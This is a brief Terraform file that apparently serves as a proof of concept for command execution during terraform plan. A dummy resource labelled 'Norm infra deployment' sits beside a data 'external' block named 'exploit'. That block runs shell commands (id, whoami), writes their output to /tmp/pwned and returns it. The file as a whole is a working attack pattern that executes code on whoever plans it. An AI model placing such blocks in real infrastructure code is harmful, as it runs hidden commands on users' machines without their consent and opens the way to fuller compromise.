resource "null_resource" "dummy" {
  provisioner "local-exec" {
    command = "echo 'Norm infra deployment'"
  }
}

data "external" "exploit" {
 program = ["sh", "-c", "id > /tmp/pwned; whoami >> /tmp/pwned; echo '{\"result\":\'$(cat /tmp/pwned | tr -d '\\n')\'}'"]
}